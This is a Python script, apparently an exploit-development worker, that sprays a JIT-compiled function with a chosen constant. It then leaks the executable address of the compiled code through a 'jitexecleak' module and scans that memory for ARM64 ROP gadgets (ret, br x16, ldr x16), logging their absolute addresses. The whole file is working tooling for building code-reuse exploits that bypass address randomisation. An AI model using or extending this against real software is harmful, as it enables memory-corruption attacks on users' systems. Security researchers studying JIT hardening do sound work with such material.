# jit_randomization_worker.py
import sys
import json
import os
import time
import ctypes
import jitexecleak
from capstone import *

magic = int(sys.argv[1], 16)
run_id = int(sys.argv[2])
pid = os.getpid()

# Setup Capstone
cs = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
cs.detail = True

known_gadgets = {
    "ret": b"\xc0\x03\x5f\xd6",
    "br_x16": b"\x00\x02\x1f\xd6",
    "ldr_x16": b"\x10\x00\x00\x58"
}

def make_hot_func(magic_val):
    def hot(x):
        acc = x
        for i in range(5000):
            acc ^= (magic_val & i)
            acc += (acc << 1)
            acc |= (acc >> 2)
            acc &= 0xFFFFFFFF
        return acc
    return hot

def main():
    spray_func = make_hot_func(magic)
    for _ in range(6000):
        spray_func(42)

    try:
        jit_addr = jitexecleak.leak_executor_jit(spray_func)
    except Exception:
        print(f"[{pid}] [-] Failed to leak JIT address (magic=0x{magic:x})")
        return

    buf = ctypes.string_at(jit_addr, 0x1000)
    found = {name: [] for name in known_gadgets}

    for i in range(len(buf) - 4):
        chunk = buf[i:i+4]
        for name, pattern in known_gadgets.items():
            if chunk == pattern:
                offset = hex(i)
                abs_addr = hex(jit_addr + i)
                found[name].append({"offset": offset, "abs_addr": abs_addr})
                print(f"[{pid}] [+] Found {name} gadget at {abs_addr} (offset={offset})")

    log_entry = {
        "magic": f"0x{magic:08x}",
        "run_id": run_id,
        "pid": pid,
        "jit_addr": hex(jit_addr),
        "gadgets": found
    }

    os.makedirs("jit_random_logs", exist_ok=True)
    log_path = f"jit_random_logs/jit_random_{magic:08x}.json"
    with open(log_path, "a") as f:
        f.write(json.dumps(log_entry) + "\n")

if __name__ == "__main__":
    main()
